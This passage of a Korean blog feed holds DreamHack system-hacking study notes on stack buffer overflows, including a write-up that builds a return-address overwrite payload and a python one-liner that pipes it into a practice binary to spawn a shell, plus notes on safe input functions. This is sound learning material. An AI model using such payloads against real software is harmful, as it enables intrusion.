	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Input: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;setvbuf 함수는 file I/O 작업 시 해당 작업의 속도가 메모리를 읽고 쓰는 것에 비해 너무 느리다 보니 버퍼를 선언하고 파일에 쓸 데이터/ 읽어올 데이터를 대용량으로 한 번에 저장한 후 지정된 조건을 만족하면 파일와의 상호작용을 하게끔 해서 비효율적인 자원 사용을 지양하기 위해 사용된다.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;위 코드의 exploitable 한 부분은 사용자와의 상호작용을 하는 부분, 즉 main 함수에서 Input을 받는 부분이다. 해당 부분에 payload를 입력하면 익스가 가능할 것이다.&lt;/p&gt;

&lt;p&gt;그렇다면 어떤 형태의 익스가 가능할까? main함수에서 buf라는 지역변수를 단 하나 설정해 두었고, 취약한 함수인 scanf 함수를 썼다. 또한 main 함수의 스택 프레임은 buf 아래에 libc_start_main 함수의 SFP, 그리고 그 아래에 rip의 ret add로 구성되어 있을 것이다.&lt;/p&gt;

&lt;p&gt;즉, ret add 조작으로 이어지는 스택 버퍼 오버플로우를 일으킬 수 있다.&lt;/p&gt;

&lt;h2 id=&quot;2-페이로드-구상하기&quot;&gt;2. 페이로드 구상하기&lt;/h2&gt;

&lt;p&gt;그렇다면 payload의 형태는 어떻게 구성될까?&lt;/p&gt;

&lt;p&gt;당연히 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x28(+a)+0x08&lt;/code&gt; byte의 dump data + &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*get_shell()&lt;/code&gt; 일 것이다. 여기에서 buf 변수의 크기에 a byte를 더한 이유는, C언어 컴파일러가 자체적으로 버퍼를 보호하기 위해서 명시적으로 선언된 버퍼에 몇 byte를 붙여 실질적인 스택 버퍼를 선언하는 경우가 있기 때문이다.&lt;/p&gt;

&lt;p&gt;이 경우에는 익스할 프로그램이 컴파일된 환경과 동일한 환경에서 컴파일 후 버퍼의 크기가 어떻게 선언되는지 확인해야 한다.&lt;/p&gt;

&lt;p&gt;해당 프로그램을 컴파일한 후, gdb에 물려 스택의 상황과 인스트럭션을 확인해 보았더니 아래와 같았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack53/Untitled.jpeg&quot; alt=&quot;main 함수에서 선언된 지역 변수의 크기는 0x28인데, 스택은 0x30만큼을 확보하는 모습.&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;main 함수에서 선언된 지역 변수의 크기는 0x28인데, 스택은 0x30만큼을 확보하는 모습.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack53/Untitled%201.jpeg&quot; alt=&quot;흰색 블록 처리된 부분의 왼쪽은 SFP, 오른쪽은 rip ret add 이다.&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;흰색 블록 처리된 부분의 왼쪽은 SFP, 오른쪽은 rip ret add 이다.&lt;/p&gt;

&lt;p&gt;즉, &lt;a href=&quot;https://toubva.github.io/blog/system-hacking-step3-2/#/&quot;&gt;예전에 풀었던 문제&lt;/a&gt;처럼 C 컴파일러가 Char 배열을 할당할 때 8byte를 더 할당해 준 것을 확인할 수 있었다.&lt;/p&gt;

&lt;p&gt;따라서 정확한 payload의 구조는 아래와 같다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x30byte + 8byte&lt;/code&gt; dump data + &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*get_shell&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;이제 get_shell의 주소를 구해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack53/Untitled%202.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x4011dd&lt;/code&gt; 로 확인되었다.&lt;/p&gt;

&lt;p&gt;즉, payload는 아래와 같다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;“A”*0x38 + 0x4011dd&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;3-익스플로잇-코드-작성하기&quot;&gt;3. 익스플로잇 코드 작성하기&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack53/Untitled%203.jpeg&quot; alt=&quot;작성한 익스플로잇 코드.&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;작성한 익스플로잇 코드.&lt;/p&gt;

&lt;p&gt;위의 코드를 실행한 결과는 아래와 같았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack53/Untitled%204.jpeg&quot; alt=&quot;쉘을 획득하는 데 성공했다.&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;쉘을 획득하는 데 성공했다.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;코스-내용-학습&quot;&gt;코스 내용 학습:&lt;/h1&gt;

&lt;h2 id=&quot;1-취약점-분석&quot;&gt;1. 취약점 분석&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;프로그램의 취약점은 한 마디로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scanf(&quot;%s&quot;, buf)&lt;/code&gt; 함수 사용 취약점이다.
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scanf&lt;/code&gt; 함수의 포맷 스트링의 한 종류인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%s&lt;/code&gt; 는 “문자열”&lt;/li&gt;
      &lt;li&gt;그런데, C 언어의 특성상 이는 띄어쓰기, 탭, 개행 문자가 들어올 때까지 계속 입력을 받아버림.&lt;/li&gt;
      &lt;li&gt;즉, 입력 길이에 제한을 두지 않는 것이나 마찬가지. → 오버플로우 발생 공격 가능&lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;따라서 scanf에서 %s 사용은 엄금, %[n]s 로 정확히 n개 문자만 입력받도록 설정할 것!&lt;/strong&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;C/C++의 표준 함수 중 버퍼를 다루면서 길이를 입력하지 않는 함수들은 대부분 위험하다.&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;예: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strcpy&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strcat&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sprintf&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;반례(버퍼 크기 입력을 받음): &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strncpy&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strncat&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snprintf&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fgets&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;memcpy&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;위험한 함수는 &lt;strong&gt;OOB 취약점&lt;/strong&gt; 등의 심각한 취약점이 될 수 있음.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;1) 입력의 길이를 제한하는 문자열 함수 사용 2) 문자열 사용 시 해당 문자열이 NULL byte로 종결되는지 확인&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;프로그램의 취약점을 찾을 땐 위 항목을 역으로 이용하면 좋다.&lt;/li&gt;
&lt;/ul&gt;

&lt;aside&gt;
💡 OOB(Out Of Bound): C계열 언어에서 문자열을 읽어올 때, 문자열의 종결을 알리는 NULL byte를 찾지 못해 프로그래머가 의도한 크기를 넘어서 문자열의 인덱스를 참조하는 현상(Index Out-Of-Bound)을 발생시키는 취약점.

&lt;/aside&gt;

&lt;h2 id=&quot;2-취약점-트리거&quot;&gt;2. 취약점 트리거&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;이미 앞에서 취약점 트리거를 완료했기 때문에, 여기에서는 교안으로 보고 새로 알게 된 내용만 정리해 작성한다.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;프로그램을 실행한 후, 프로그램의 입장에서는 말도 안 될 만큼 긴 입력(64byte)를 줘 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack53/Untitled%205.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;그 결과, ‘Segmentation fault’ 라는 에러가 출력되면서 프로그램이 강제 종료된다. Segmentation은 앞에서 배웠듯 운영체제가 관리하는 프로세스의 메모리 구조인데, 이러한 구조에 문제가 생겼다는 뜻으로 해석된다.&lt;/p&gt;

&lt;p&gt;즉, 프로그램이 잘못된 메모리 섹션에 접근했으므로 버그가 발생했다는 의미이다.&lt;/p&gt;

&lt;p&gt;그리고 마지막의 ‘core dumped’는 코어파일을 생성했다는 의미로, 프로그램이 위와 같이 비정상적으로 종료됐을 때, 디버깅을 수월하게 하기 위해 운영체제가 만들어 주는 것이다. 만일 위와 같은 알림이 떴음에도 코어 파일이 생성되지 않았다면 생성해야 할 코어 파일의 크기가 시스템에서 정한 한도를 초과했기 때문이다.&lt;/p&gt;

&lt;p&gt;해당 한도는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ulimit -c unlimited&lt;/code&gt; 로 해제할 수 있다.&lt;/p&gt;

&lt;p&gt;보통은 현재 디렉터리 아래에 core라는 폴더가 생기고, 그 안에 코어 덤프가 저장되어야 하는데… 내가 사용하는 Ubuntu 20.04+ 는 apport에 의해서 core dumping이 intercept돼 운영체제가 아니라 apport가 코어 덤프를 만들도록 되어 있었다… 그래서 한참을 뒤져 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/lib/apport/coredump&lt;/code&gt; 에서 코어 덤프들을 찾아낼 수 있었다.&lt;/p&gt;

&lt;p&gt;그런데 또 문제상황.. 해당 코어 덤프와 원본 프로그램을 gdb에 같이 물려서 코드와 스택을 확인해 보려 했는데, Maximum recursion depth exceeded in comparison 오류가 떠서 제대로 안 되었다.&lt;/p&gt;

&lt;p&gt;결국 시간이 부족한 관계로 코어 덤프 분석은 교안을 읽고 마무리하기로 했다… 코어 덤프 분석의 결론은 SBOF로 인해 ret add가 입력값으로 덮어씌워졌고, 당연히 그것은 실행가능한 메모리 주소가 아니기 때문에 Segmentation fault가 발생했다는 것이었다.&lt;/p&gt;

&lt;h2 id=&quot;3-익스플로잇&quot;&gt;3. 익스플로잇&lt;/h2&gt;

&lt;p&gt;이미 문제를 풀었고, 해당 원리를 알고 있기 때문에 각 페이즈에서 모르는 부분만 간단히 정리한다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;스택 프레임 구조 파악&lt;/li&gt;
  &lt;li&gt;get_shell() 주소 파악
    &lt;ul&gt;
      &lt;li&gt;gdb에서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;print get_shell&lt;/code&gt; 하면 된다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;페이로드 구성
    &lt;ul&gt;
      &lt;li&gt;구성한 페이로드의 중요 데이터는 반드시 엔디언(Endian)을 적용시켜서 프로그램에 전달해야 한다.
        &lt;ul&gt;
          &lt;li&gt;예: get_shell()의 주소는 대상 시스템의 아키텍처에 따라 엔디언을 다르게 적용시켜서 페이로드에 합쳐야 한다. ( \xa7\x05\x40…즉 바이너리 포맷으로)&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;익스플로잇
    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;나는 파이썬의 pwntools를 이용했는데, 해당 교안에서는 바로 파이썬 커맨드를 이용해 익스플로잇을 수행했기 때문에 해당 커맨드를 아래에 적는다.&lt;/p&gt;

        &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;python&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;import sys;sys.stdout.buffer.write(b&apos;A&apos;*0x30 + b&apos;B&apos;*0x08 + b&apos;{리틀_엔디언으로_작성된_대상_함수_주소}&apos;)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rao&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;그리고 익스플로잇에 성공하여 &lt;strong&gt;쉘을 땄다면, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id&lt;/code&gt; 커맨드&lt;/strong&gt;를 쳐서 현재 계정의 권한을 출력해서 보여주는 것으로 증명한다.&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;취약점-패치&quot;&gt;취약점 패치&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;C언어에서 자주 사용되는 문자열 입력 함수들의 패턴을 알고, 적절히 사용해야 한다.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack53/Untitled%206.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;널 종결: 문자열의 끝에 널이 있어서 문자열의 끝이 명시되는 것.&lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Mon, 22 Aug 2022 09:55:23 -0500</pubDate>
        <link>https://touBVa.github.io/blog/dreamhack_system_hacking/step5-3</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/dreamhack_system_hacking/step5-3</guid>
      </item>
    
      <item>
        <title>System Hackig Step 5-2</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#stage-5-2&quot; id=&quot;markdown-toc-stage-5-2&quot;&gt;STAGE 5-2&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#memory-corruption-stack-buffer-overflow&quot; id=&quot;markdown-toc-memory-corruption-stack-buffer-overflow&quot;&gt;Memory Corruption: Stack Buffer Overflow&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#목표&quot; id=&quot;markdown-toc-목표&quot;&gt;목표&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#주의점&quot; id=&quot;markdown-toc-주의점&quot;&gt;주의점&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#스택-버퍼-오버플로우와-악용-경우수&quot; id=&quot;markdown-toc-스택-버퍼-오버플로우와-악용-경우수&quot;&gt;스택 버퍼 오버플로우와 악용 경우수&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#1-버퍼-오버플로우&quot; id=&quot;markdown-toc-1-버퍼-오버플로우&quot;&gt;1. 버퍼 오버플로우&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#버퍼&quot; id=&quot;markdown-toc-버퍼&quot;&gt;버퍼:&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#버퍼-오버플로우&quot; id=&quot;markdown-toc-버퍼-오버플로우&quot;&gt;버퍼 오버플로우:&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#스택-버퍼-오버플로우&quot; id=&quot;markdown-toc-스택-버퍼-오버플로우&quot;&gt;스택 버퍼 오버플로우:&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#2-중요-데이터-변조&quot; id=&quot;markdown-toc-2-중요-데이터-변조&quot;&gt;2. 중요 데이터 변조&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#3-데이터-유출&quot; id=&quot;markdown-toc-3-데이터-유출&quot;&gt;3. 데이터 유출&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#4-실행-흐름-조작&quot; id=&quot;markdown-toc-4-실행-흐름-조작&quot;&gt;4. 실행 흐름 조작&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;stage-5-2&quot;&gt;STAGE 5-2&lt;/h1&gt;

&lt;h1 id=&quot;memory-corruption-stack-buffer-overflow&quot;&gt;Memory Corruption: Stack Buffer Overflow&lt;/h1&gt;

&lt;p&gt;스택 버퍼 오버플로우는 매우 역사가 오래된 취약점이며, 현재 실시간으로 다수 소프트웨어에서 발견되고 있는 현재진행형인 취약점이다.&lt;/p&gt;

&lt;h2 id=&quot;목표&quot;&gt;목표&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;스택 버퍼 오버플로우의 원인 알기&lt;/li&gt;
  &lt;li&gt;스택 버퍼 오버플로우로 인해 발생하는 보안 문제 알기&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;주의점&quot;&gt;주의점&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;스택 오버플로우 ≠ 스택 버퍼 오버플로우
    &lt;ul&gt;
      &lt;li&gt;스택 오버플로우: 한정된 크기의 메모리 안에서 스택 영역이 너무 많이 확장되어 발생하는 버그&lt;/li&gt;
      &lt;li&gt;스택 버퍼 오버플로우: 스택에 위치한 버퍼에 버퍼의 크기보다 많은 데이터가 입력되어 발생하는 버그&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;스택-버퍼-오버플로우와-악용-경우수&quot;&gt;스택 버퍼 오버플로우와 악용 경우수&lt;/h1&gt;

&lt;h2 id=&quot;1-버퍼-오버플로우&quot;&gt;1. 버퍼 오버플로우&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;스택 버퍼 오버플로우란, &lt;strong&gt;스택&lt;/strong&gt;의 &lt;strong&gt;버퍼&lt;/strong&gt;에서 발생하는 &lt;strong&gt;오버플로우&lt;/strong&gt;&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;Q. 버퍼란 무엇이고, 오버플로우란 무엇일까?&lt;/strong&gt;&lt;/p&gt;

&lt;/blockquote&gt;

&lt;h3 id=&quot;버퍼&quot;&gt;버퍼:&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;“데이터가 목적지로 이동되기 전에 보관되는 임시 저장소”&lt;/li&gt;
  &lt;li&gt;현대에는 “데이터가 저장될 수 있는 모든 단위”
    &lt;ul&gt;
      &lt;li&gt;지역 변수에 할당된 메모리 영역은 ‘스택 버퍼’&lt;/li&gt;
      &lt;li&gt;힙에 할당된 메모리 영역은 ‘힙 버퍼’라고 부르는 것과 같다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;버퍼-오버플로우&quot;&gt;버퍼 오버플로우:&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;버퍼가 넘치는 것: 지정된 버퍼 크기보다 큰 데이터가 입력되어 발생한다.&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;“버퍼”, 즉 어떤 변수든 데이터든 담기도록 &lt;strong&gt;할당된 메모리 영역의 크기를 뛰어넘는 데이터를 인풋&lt;/strong&gt;했을 떄 발생한다.&lt;/li&gt;
      &lt;li&gt;일반적으로 &lt;strong&gt;버퍼는 메모리상에 연속해서 할당&lt;/strong&gt;되어 있기 때문에, 어떤 버퍼에서의 오버플로우는 &lt;strong&gt;뒤에 있는 버퍼들의 값이 조작&lt;/strong&gt;되게 할 수 있다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;그 어떤 메모리 영역에서 발생하더라도 매우 심각한 보안 위협으로 이어진다.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;스택-버퍼-오버플로우&quot;&gt;스택 버퍼 오버플로우:&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;스택 영역에서 할당한 버퍼가 오버플로우되는 것.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;2-중요-데이터-변조&quot;&gt;2. 중요 데이터 변조&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;BOF 발생 버퍼 뒤에 중요한 데이터가 있다면, 해당 데이터가 변조됨으로써 문제가 발생할 수 있다.
    &lt;ul&gt;
      &lt;li&gt;표현식의 변조&lt;/li&gt;
      &lt;li&gt;통신 주소 변조&lt;/li&gt;
      &lt;li&gt;…etc&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;예제를 분석하며 BOF의 감을 잡아 보자. 사실 나는 저번에 풀었던 문제 정도를 예상하고 에이 똑같은 이야긴가~ 하며 방심했는데, 전혀 아니었다. 설명을 읽고 뒤통수를 한 대 맞은 기분이었기 때문에, 나와 비슷한 초보자 분들도 이건 꼭 보셨으면 좋겠다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack52/Untitled.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;원래 main 함수가 따로 있는데, 가장 중요한 check_auth 함수만 잘라서 가져왔다. 여기에서 집중해볼 것은, temp[16]과 strncpy(temp, password, strlen(password))이다. strncpy 자체가 BOF에 취약한 함수인 데다가 temp[16]은 16바이트로 크기가 정해진 배열이다.&lt;/p&gt;

&lt;p&gt;즉, strncpy를 돌릴 때 16바이트를 초과하는 문자열을 전달한다면 temp 지역 변수를 담는 스택의 버퍼가 overflow 되면서 바로 그 밑에 할당된 auth 지역 변수의 데이터가 오염될 수 있다는 것이다.&lt;/p&gt;

&lt;p&gt;위 취약점을 이용해 실제 관리자 비밀번호가 아닌 아무 데이터나 입력하면서 auth 버퍼의 데이터가 1로 변경되도록 변조한다면 인증을 통과할 수 있을 것이다.&lt;/p&gt;

&lt;h2 id=&quot;3-데이터-유출&quot;&gt;3. 데이터 유출&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;C언어의 경우 문자열의 종결은 NULL byte로 표현되고, 스택에서 데이터를 읽어올 때 NULL byte 전까지 읽어옴&lt;/li&gt;
  &lt;li&gt;즉, 어떤 버퍼에 오버플로우를 일으킴 → 다른 버퍼와의 사이에 있는 NULL byte 모두 제거 → 해당 버퍼의 데이터 유출 가능&lt;/li&gt;
  &lt;li&gt;Stack Canary를 이런 식으로 덮어씌워서 다음 버퍼의 데이터가 유출되게끔 할 수 있겠다!&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;4-실행-흐름-조작&quot;&gt;4. 실행 흐름 조작&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;새로운 스택 프레임을 생성할 때, 이전 스택 프레임의 맨 꼭대기에 리턴 주소를 저장한다는 사실을 악용
    &lt;ul&gt;
      &lt;li&gt;[새로운 스택 프레임: 지역 변수들…]&lt;/li&gt;
      &lt;li&gt;[새로운 스택 프레임: SFP(이전 스택 프레임의 함수에서 사용하던 스택의 바닥 주소)]&lt;/li&gt;
      &lt;li&gt;[옛날 스택 프레임: Return Address]&lt;/li&gt;
      &lt;li&gt;순이라는 걸 잊지 말자!&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;스택 버퍼 오버플로우를 일으켜, 리턴 주소를 조작해 원하는 프로세스가 실행되게끔 함&lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Wed, 17 Aug 2022 00:25:23 -0500</pubDate>
        <link>https://touBVa.github.io/blog/dreamhack_system_hacking/step5-2</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/dreamhack_system_hacking/step5-2</guid>
      </item>
    
      <item>
        <title>System Hackig Step 5</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#stage-5&quot; id=&quot;markdown-toc-stage-5&quot;&gt;STAGE 5&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#1-calling-convention&quot; id=&quot;markdown-toc-1-calling-convention&quot;&gt;1. Calling Convention&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-함수-호출-규약의-종류&quot; id=&quot;markdown-toc-2-함수-호출-규약의-종류&quot;&gt;2. 함수 호출 규약의 종류&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#3-x86호출-규약-cdecl&quot; id=&quot;markdown-toc-3-x86호출-규약-cdecl&quot;&gt;3. x86호출 규약: cdecl&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#들어가기-전에&quot; id=&quot;markdown-toc-들어가기-전에&quot;&gt;들어가기 전에:&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#실습&quot; id=&quot;markdown-toc-실습&quot;&gt;실습&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#4-x86-64-호출-규약-sysv&quot; id=&quot;markdown-toc-4-x86-64-호출-규약-sysv&quot;&gt;4. x86-64 호출 규약: SYSV&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#gdb로-sysv-calling-convention-알아보기&quot; id=&quot;markdown-toc-gdb로-sysv-calling-convention-알아보기&quot;&gt;GDB로 SYSV Calling Convention 알아보기&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#코드-컴파일&quot; id=&quot;markdown-toc-코드-컴파일&quot;&gt;코드 컴파일&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#인자-전달&quot; id=&quot;markdown-toc-인자-전달&quot;&gt;인자 전달&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#반환-주소--스택-프레임-저장&quot; id=&quot;markdown-toc-반환-주소--스택-프레임-저장&quot;&gt;반환 주소 &amp;amp; 스택 프레임 저장&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#새로운-스택-프레임-할당&quot; id=&quot;markdown-toc-새로운-스택-프레임-할당&quot;&gt;새로운 스택 프레임 할당&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#반환값-전달&quot; id=&quot;markdown-toc-반환값-전달&quot;&gt;반환값 전달&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#반환&quot; id=&quot;markdown-toc-반환&quot;&gt;반환&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#5-부록-함수-호출-규약&quot; id=&quot;markdown-toc-5-부록-함수-호출-규약&quot;&gt;5. 부록-함수 호출 규약&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;stage-5&quot;&gt;STAGE 5&lt;/h1&gt;

&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;함수 호출 규약의 정의와 종류 알기&lt;/li&gt;
